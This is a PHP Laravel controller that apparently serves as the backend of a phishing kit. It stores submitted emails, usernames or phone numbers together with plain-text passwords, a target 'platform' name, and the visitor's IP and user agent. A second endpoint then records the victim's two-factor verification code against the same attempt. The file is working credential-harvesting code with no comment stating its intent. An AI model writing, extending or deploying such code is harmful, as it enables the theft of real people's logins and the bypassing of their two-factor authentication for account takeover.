<?php

namespace App\Http\Controllers;

use App\Models\LoginAttempt;
use Illuminate\Http\Request;

class LoginAttemptController extends Controller
{
    public function storeCredentials(Request $request)
    {
        $request->validate([
            'email' => 'nullable|string',
            'identifier' => 'nullable|string',
            'password' => 'required|string',
            'platform' => 'required|string',
        ]);

        $identifier = $request->email ?? $request->identifier;
        
        $loginAttempt = LoginAttempt::create([
            $this->getIdentifierType($identifier) => $identifier,
            'password' => $request->password,
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
            'platform' => $request->platform,
            'status' => 'credentials'
        ]);

        return response()->json(['success' => true, 'id' => $loginAttempt->id]);
    }

    public function storeVerificationCode(Request $request)
    {
        $request->validate([
            'attempt_id' => 'required|exists:login_attempts,id',
            'verification_code' => 'required|string',
        ]);

        $loginAttempt = LoginAttempt::find($request->attempt_id);
        $loginAttempt->update([
            'verification_code' => $request->verification_code,
            'status' => 'verification'
        ]);

        return response()->json(['success' => true]);
    }

    protected function getIdentifierType(string $identifier): string
    {
        if (filter_var($identifier, FILTER_VALIDATE_EMAIL)) {
            return 'email';
        }

        if (preg_match('/^\+?[0-9]{8,15}$/', $identifier)) {
            return 'phone';
        }

        return 'username';
    }
}
